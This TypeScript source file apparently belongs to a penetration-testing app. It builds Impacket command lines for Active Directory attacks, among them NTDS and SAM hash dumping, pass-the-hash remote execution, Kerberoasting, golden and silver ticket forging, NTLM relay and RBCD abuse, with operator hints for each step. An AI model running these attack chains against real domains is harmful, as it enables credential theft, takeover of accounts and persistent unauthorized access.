import { quoteHydraArg } from "./hydra-args";

export const IMPACKET_MODES = [
  "secrets-remote",
  "secrets-sam",
  "secrets-ntds",
  "psexec",
  "smbexec",
  "wmiexec",
  "atexec",
  "mssql",
  "smbclient",
  "asrep",
  "kerberoast",
  "gettgt",
  "getst",
  "ticketer",
  "ticket",
  "lookupsid",
  "rpcdump",
  "samrdump",
  "adusers",
  "delegation",
  "services",
  "reg",
  "passwd",
  "addcomputer",
  "rbcd",
  "relay",
  "smbserver",
] as const;

export type ImpacketMode = (typeof IMPACKET_MODES)[number];

export type ImpacketInput = {
  mode: ImpacketMode;
  host: string;
  domain: string;
  user: string;
  password: string;
  hash: string;
  dc: string;
  command: string;
  share: string;
  file: string;
  file2: string;
  file3: string;
  spn: string;
  impersonate: string;
  sid: string;
  usersFile: string;
  computer: string;
  delegateTo: string;
  keyName: string;
  newPass: string;
  kerberos: boolean;
  ntlmOnly: boolean;
  hashcat: boolean;
  action: "read" | "write";
};

export type ImpacketPlan = {
  bin: string;
  args: string[];
  command: string;
  why: string;
  note: string;
  run: boolean;
};

const BINS = new Set([
  "impacket-secretsdump",
  "impacket-psexec",
  "impacket-smbexec",
  "impacket-wmiexec",
  "impacket-atexec",
  "impacket-mssqlclient",
  "impacket-smbclient",
  "impacket-GetNPUsers",
  "impacket-GetUserSPNs",
  "impacket-getTGT",
  "impacket-getST",
  "impacket-ticketer",
  "impacket-describeTicket",
  "impacket-lookupsid",
  "impacket-rpcdump",
  "impacket-samrdump",
  "impacket-GetADUsers",
  "impacket-findDelegation",
  "impacket-services",
  "impacket-reg",
  "impacket-changepasswd",
  "impacket-addcomputer",
  "impacket-rbcd",
  "impacket-ntlmrelayx",
  "impacket-smbserver",
]);

function modeOk(value: string): value is ImpacketMode {
  return (IMPACKET_MODES as readonly string[]).includes(value);
}

function hostOk(value: string): boolean {
  if (/^(?:\d{1,3}\.){3}\d{1,3}$/.test(value)) return value.split(".").every((part) => Number(part) <= 255);
  return /^[A-Za-z0-9][A-Za-z0-9.-]{0,80}$/.test(value);
}

function nameOk(value: string): boolean {
  return /^[A-Za-z0-9][A-Za-z0-9._$-]{0,64}$/.test(value);
}

function pathOk(value: string): boolean {
  return /^[A-Za-z0-9_./:@+=,~-]{1,200}$/.test(value) && !value.split(/[\\/]/).includes("..");
}

function hashOk(value: string): string | null {
  if (/^[0-9a-fA-F]{32}$/.test(value)) return `:${value}`;
  if (/^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$/.test(value)) return value;
  return null;
}

function dcOk(value: string): boolean {
  return value === "" || hostOk(value);
}

function commandOk(value: string): boolean {
  return value.length > 0 && value.length <= 200 && !/[\r\n\0]/.test(value);
}

function finish(bin: string, args: string[], why: string, note: string, run: boolean): ImpacketPlan {
  return { bin, args, command: [bin, ...args.map(quoteHydraArg)].join(" "), why, note, run };
}

function auth(input: ImpacketInput, host: string): { ident: string; flags: string[] } | { error: string } {
  if (!nameOk(input.user)) return { error: "The user is letters, numbers, dot, underscore, or $." };
  if (input.domain && !/^[A-Za-z0-9][A-Za-z0-9.-]{0,80}$/.test(input.domain)) return { error: "The domain is a name such as corp.local." };
  const who = input.domain ? `${input.domain}/${input.user}` : input.user;
  if (input.kerberos) return { ident: host ? `${who}@${host}` : who, flags: ["-k", "-no-pass"] };
  const hash = input.hash.trim();
  if (hash) {
    const shaped = hashOk(hash);
    if (!shaped) return { error: "The hash is 32 hex characters, or LM:NT." };
    return { ident: host ? `${who}@${host}` : who, flags: ["-hashes", shaped] };
  }
  if (!input.password || input.password.length > 128 || /[\r\n\0@]/.test(input.password)) {
    return { error: "The password is required, unless you give a hash or Kerberos. An @ in the password breaks the target syntax. Use the hash instead." };
  }
  return { ident: host ? `${who}:${input.password}@${host}` : `${who}:${input.password}`, flags: [] };
}

function withDc(flags: string[], dc: string): string[] | { error: string } {
  if (!dc) return flags;
  if (!hostOk(dc)) return { error: "DC IP is one host, usually the domain controller." };
  return [...flags, "-dc-ip", dc];
}

export function impacketPlan(input: ImpacketInput): ImpacketPlan | { error: string } {
  if (!modeOk(input.mode)) return { error: "Pick an Impacket tool." };
  if (!dcOk(input.dc)) return { error: "DC IP is one host." };

  if (input.mode === "secrets-sam" || input.mode === "secrets-ntds") {
    if (!pathOk(input.file) || !pathOk(input.file2)) return { error: "SAM or NTDS, and SYSTEM, are file names on Kali. No .. in the path." };
    const args = input.mode === "secrets-sam" ? ["-sam", input.file, "-system", input.file2] : ["-ntds", input.file, "-system", input.file2];
    if (input.file3) {
      if (!pathOk(input.file3)) return { error: "SECURITY is a file name on Kali." };
      args.push("-security", input.file3);
    }
    args.push("LOCAL");
    return finish(
      "impacket-secretsdump",
      args,
      input.mode === "secrets-sam"
        ? "LOCAL means the hives are files on Kali, not a login to the target. -sam and -system are both required. The boot key is in SYSTEM. SECURITY is only needed for LSA secrets."
        : "NTDS.dit plus SYSTEM is a domain dump you already copied off the DC. This does not touch the network. The output is the NT hash of every account.",
      "Run this on Kali after the files are on disk. The Administrator NT hash is what you pass. You do not crack it first.",
      true,
    );
  }

  if (input.mode === "smbserver") {
    if (!/^[A-Za-z0-9]{1,16}$/.test(input.share)) return { error: "The share name is a short word, such as share." };
    if (!pathOk(input.file)) return { error: "The folder is a path on Kali. No .. in the path." };
    return finish(
      "impacket-smbserver",
      [input.share, input.file],
      "This listens on Kali, port 445, and serves that folder. The target then copies from \\\\your-tun0-ip\\SHARE. It is not a login to the target.",
      "If Kali already has something on 445, this fails. Kill stops the listener. Do not point it at your home directory.",
      true,
    );
  }

  if (input.mode === "ticket") {
    if (!pathOk(input.file)) return { error: "The ticket is a .ccache or .kirbi path on Kali." };
    return finish(
      "impacket-describeTicket",
      [input.file],
      "Prints who the ticket is for, the domain, and when it expires. Read this before you export KRB5CCNAME and try the ticket.",
      "A ticket that is already expired will not log you in. Get another one.",
      true,
    );
  }

  if (input.mode === "relay") {
    if (!pathOk(input.usersFile)) return { error: "The target file is one host per line, a path on Kali." };
    return finish(
      "impacket-ntlmrelayx",
      ["-tf", input.usersFile, "-smb2support", "-socks"],
      "-tf is the list of hosts to relay into, on Kali. -socks holds the session so you can point other tools at it. This does not run a command on the far side.",
      "This listens until you press Kill. Relay only works if some other host authenticates to you. It is not the first check.",
      true,
    );
  }

  const needsHost = ["secrets-remote", "psexec", "smbexec", "wmiexec", "atexec", "mssql", "smbclient", "lookupsid", "rpcdump", "samrdump", "services", "reg"].includes(input.mode);
  if (needsHost && !hostOk(input.host)) return { error: "The target is one IP or one host name." };

  const skipAuth = input.mode === "asrep" || input.mode === "ticketer";
  const signed = skipAuth ? { ident: "", flags: [] as string[] } : auth(input, needsHost ? input.host : "");
  if ("error" in signed) return signed;
  const dcFlags = withDc(signed.flags, input.dc);
  if ("error" in dcFlags) return dcFlags;

  if (input.mode === "secrets-remote") {
    const args = [signed.ident, ...dcFlags];
    if (input.ntlmOnly) args.push("-just-dc-ntlm");
    if (input.user && input.domain && input.computer) {
      if (!nameOk(input.computer)) return { error: "That account name is letters, numbers, dot, underscore, or $." };
      args.push("-just-dc-user", input.computer);
    }
    return finish(
      "impacket-secretsdump",
      args,
      "One login to the DC, or to a host where you are already an admin. It prints NT hashes. -just-dc-ntlm skips the extra noise. -just-dc-user dumps one account when you already know the name.",
      "A domain dump is the DC, not a workstation. The hash you want is the NT half, after the colon.",
      true,
    );
  }

  if (input.mode === "psexec" || input.mode === "smbexec" || input.mode === "wmiexec" || input.mode === "atexec") {
    const bins = { psexec: "impacket-psexec", smbexec: "impacket-smbexec", wmiexec: "impacket-wmiexec", atexec: "impacket-atexec" } as const;
    const command = input.command.trim();
    if (!command) {
      return finish(
        bins[input.mode],
        [signed.ident, ...dcFlags],
        `${bins[input.mode]} with no command opens a shell and waits. The desk closes stdin, so that shell would die. Copy this into your own terminal.`,
        "You already need admin on that host. psexec writes a service. smbexec uses a different service. wmiexec does not drop a binary. atexec uses Task Scheduler and then exits.",
        false,
      );
    }
    if (!commandOk(command)) return { error: "The command is one line, under 200 characters." };
    return finish(
      bins[input.mode],
      [signed.ident, ...dcFlags, command],
      "The command is one shot. The tool runs it and exits. whoami is the check that the shell would have been yours. Do not start with a payload.",
      "Admin on that one host. If this is a domain controller, you already have the keys.",
      true,
    );
  }

  if (input.mode === "mssql") {
    const args = [signed.ident, ...signed.flags];
    if (input.domain) args.push("-windows-auth");
    return finish(
      "impacket-mssqlclient",
      args,
      "A SQL shell, not an OS shell. -windows-auth is a domain account. Without it, the account is a SQL login such as sa. Copy this into a terminal. The desk cannot type the SQL for you.",
      "enable_xp_cmdshell is only after the server already says you are sysadmin. A login that is not sysadmin is not a shell.",
      false,
    );
  }

  if (input.mode === "smbclient") {
    const args = [signed.ident, ...dcFlags];
    if (input.share && !nameOk(input.share)) return { error: "The share name is letters and numbers, such as C$ or share." };
    if (input.share) args.push(input.share);
    return finish(
      "impacket-smbclient",
      args,
      "An SMB shell on that host. shares lists the names. use C$ then ls is the admin check. Copy this into a terminal.",
      "C$ only works if you are an admin. A normal share is still worth reading. Do not skip it because C$ failed.",
      false,
    );
  }

  if (input.mode === "asrep") {
    if (!/^[A-Za-z0-9][A-Za-z0-9.-]{0,80}$/.test(input.domain)) return { error: "The domain is a name such as corp.local." };
    if (!pathOk(input.usersFile)) return { error: "The user list is a path on Kali, one name per line." };
    const flags = withDc(["-usersfile", input.usersFile, "-no-pass"], input.dc);
    if ("error" in flags) return flags;
    if (input.hashcat) flags.push("-format", "hashcat");
    return finish(
      "impacket-GetNPUsers",
      [`${input.domain}/`, ...flags],
      "Asks the DC which of those users will hand out an AS-REP hash without a password. -no-pass is required for that. -format hashcat matches the hashcat mode you already use.",
      "No hash back means that list has no AS-REP. Do not run it again with the same list.",
      true,
    );
  }

  if (input.mode === "kerberoast") {
    if (!input.domain) return { error: "Kerberoast needs the domain name." };
    const flags = [...dcFlags, "-request"];
    if (input.hashcat) flags.push("-outputfile", "kerberoast.txt");
    return finish(
      "impacket-GetUserSPNs",
      [signed.ident, ...flags],
      "Any domain user can ask for service tickets. -request writes the crackable hash. The password you pass is the user's password, not the service account's.",
      "A ticket you cannot crack is not a login. One wordlist. Then stop.",
      true,
    );
  }

  if (input.mode === "gettgt") {
    if (!/^[A-Za-z0-9][A-Za-z0-9.-]{0,80}$/.test(input.domain)) return { error: "A TGT needs the domain name." };
    if (input.kerberos) return { error: "getTGT writes the ccache. Use a password or a hash, not a ccache you already have." };
    return finish(
      "impacket-getTGT",
      [signed.ident, ...dcFlags],
      "Writes a .ccache for that account. The next tools use it with -k -no-pass after you export KRB5CCNAME to that file.",
      "The file lands in the directory you started the desk from. export KRB5CCNAME=user.ccache in the same terminal you run the next command.",
      true,
    );
  }

  if (input.mode === "getst") {
    if (!input.domain) return { error: "A service ticket needs the domain name." };
    if (!/^[A-Za-z0-9][A-Za-z0-9._/-]{0,80}$/.test(input.spn)) return { error: "The SPN looks like cifs/dc.corp.local." };
    if (!nameOk(input.impersonate)) return { error: "Impersonate is an account name, usually Administrator." };
    const flags = [...dcFlags, "-spn", input.spn, "-impersonate", input.impersonate];
    return finish(
      "impacket-getST",
      [signed.ident, ...flags],
      "Asks for a service ticket as the account you impersonate. The account you authenticate as must already be allowed to delegate to that SPN. This is the last step of RBCD, not the first.",
      "Then export the ccache and use -k -no-pass against that one host. The SPN host and the host you log into are the same machine.",
      true,
    );
  }

  if (input.mode === "ticketer") {
    if (!/^[A-Za-z0-9][A-Za-z0-9.-]{0,80}$/.test(input.domain) || !nameOk(input.user)) return { error: "A forged ticket needs the domain and the user name." };
    if (!/^S-1-5-21-\d+-\d+-\d+$/.test(input.sid)) return { error: "The domain SID looks like S-1-5-21-1-2-3." };
    const shaped = hashOk(input.hash.trim());
    if (!shaped) return { error: "Ticketer needs the NT hash, 32 hex characters." };
    const nt = shaped.slice(shaped.indexOf(":") + 1);
    const args = ["-nthash", nt, "-domain-sid", input.sid, "-domain", input.domain];
    if (input.spn) {
      if (!/^[A-Za-z0-9][A-Za-z0-9._/-]{0,80}$/.test(input.spn)) return { error: "The SPN looks like cifs/host.corp.local." };
      args.push("-spn", input.spn);
    }
    args.push(input.user);
    return finish(
      "impacket-ticketer",
      args,
      input.spn
        ? "A silver ticket. -spn limits it to that service on that host. It does not talk to the DC. The hash is the service account's NT hash, not your own."
        : "A golden ticket. No -spn. The hash is the krbtgt NT hash from the DC dump. This is after you already own the domain, to keep access, not a way in.",
      "describeTicket on the file it writes, then KRB5CCNAME and -k -no-pass.",
      true,
    );
  }

  if (input.mode === "lookupsid" || input.mode === "rpcdump" || input.mode === "samrdump") {
    const bins = { lookupsid: "impacket-lookupsid", rpcdump: "impacket-rpcdump", samrdump: "impacket-samrdump" } as const;
    return finish(
      bins[input.mode],
      [signed.ident, ...dcFlags],
      input.mode === "lookupsid"
        ? "Walks SIDs and prints account names. A null session sometimes works. A normal user works. You are looking for names, not a shell."
        : input.mode === "rpcdump"
          ? "Lists RPC endpoints. You are looking for a name you recognise, such as a spooler or a service you can talk to. The list itself is not a bug."
          : "Dumps the account names this host will tell you. Same job as lookupsid, different pipe.",
      "Copy the names into the user list. Do not spray them all.",
      true,
    );
  }

  if (input.mode === "adusers") {
    if (!input.domain) return { error: "GetADUsers needs the domain name." };
    const flags = [...dcFlags, "-all"];
    return finish(
      "impacket-GetADUsers",
      [signed.ident, ...flags],
      "-all lists domain users. You want names that are not machine accounts, and any description that contains a password.",
      "A description with a password is a credential. The rest is a user list for later, not a thing to spray tonight.",
      true,
    );
  }

  if (input.mode === "delegation") {
    if (!input.domain) return { error: "findDelegation needs the domain name." };
    return finish(
      "impacket-findDelegation",
      [signed.ident, ...dcFlags],
      "Shows accounts that are trusted to delegate. Unconstrained is the dangerous one. Constrained tells you the SPN. RBCD does not always show here.",
      "No rows means this check is dead. Do not keep re-running it.",
      true,
    );
  }

  if (input.mode === "services") {
    return finish(
      "impacket-services",
      [signed.ident, ...dcFlags, "list"],
      "Lists services on that one host. You are looking for a path with a space and no quotes, or a binary you can replace.",
      "A long list is normal. One unquoted path is the lead. The rest is not.",
      true,
    );
  }

  if (input.mode === "reg") {
    if (!/^[A-Za-z0-9\\_. -]{1,140}$/.test(input.keyName)) return { error: "The key is a registry path, such as HKLM\\SOFTWARE." };
    return finish(
      "impacket-reg",
      [signed.ident, ...dcFlags, "query", "-keyName", input.keyName],
      "Reads one registry key over the admin share. query does not write. The usual keys are Run and Winlogon.",
      "Access denied means you are not an admin on that host. Stop. Do not try every key.",
      true,
    );
  }

  if (input.mode === "passwd") {
    if (!input.domain || !hostOk(input.dc || input.host)) return { error: "A password change needs the domain and the DC." };
    if (!commandOk(input.newPass)) return { error: "The new password is one line." };
    const target = input.dc || input.host;
    const who = auth(input, target);
    if ("error" in who) return who;
    return finish(
      "impacket-changepasswd",
      [who.ident, ...who.flags, "-newpass", input.newPass],
      "Changes that account's password. The DC will accept it if you know the current password, or if you are resetting it as an admin. This is a write. The old password stops working.",
      "Do this only when you mean to. Write the new password in your notes before you run it.",
      true,
    );
  }

  if (input.mode === "addcomputer") {
    if (!input.domain) return { error: "Adding a computer needs the domain." };
    if (!/^[A-Za-z0-9-]{1,15}$/.test(input.computer)) return { error: "The computer name is 15 characters, letters, numbers, and hyphens." };
    if (!commandOk(input.newPass)) return { error: "The computer password is one line." };
    const flags = [...dcFlags, "-computer-name", input.computer, "-computer-pass", input.newPass];
    return finish(
      "impacket-addcomputer",
      [signed.ident, ...flags],
      "Creates a machine account you control. The default domain policy allows a normal user a small number of these. The password is one you choose.",
      "This is a write on the domain. If it says the quota is full, stop. Do not try other names.",
      true,
    );
  }

  if (input.mode === "rbcd") {
    if (!input.domain) return { error: "RBCD needs the domain." };
    if (!/^[A-Za-z0-9-]{1,15}\$$/.test(input.computer) || !/^[A-Za-z0-9-]{1,15}\$$/.test(input.delegateTo)) {
      return { error: "Both computer names end with $, such as HELP$ and DC$." };
    }
    const flags = [...dcFlags, "-delegate-from", input.computer, "-delegate-to", input.delegateTo, "-action", input.action];
    return finish(
      "impacket-rbcd",
      [signed.ident, ...flags],
      input.action === "read"
        ? "Read shows who is already allowed to delegate to that computer. It changes nothing. Write is the next step, and only if you own the from account."
        : "Write lets the from computer impersonate users to the to computer. You then ask for a service ticket with getST. This changes the target.",
      "Read first. Write only when the from account is the computer you just created.",
      true,
    );
  }

  return { error: "That Impacket tool is not in the builder." };
}

export function impacketArgsOk(bin: unknown, args: unknown): args is string[] {
  if (typeof bin !== "string" || !BINS.has(bin)) return false;
  if (!Array.isArray(args) || args.length < 1 || args.length > 40) return false;
  return args.every((arg) => typeof arg === "string" && arg.length > 0 && arg.length <= 300 && !/[\r\n\0]/.test(arg) && !arg.split(/[\\/]/).includes(".."));
}
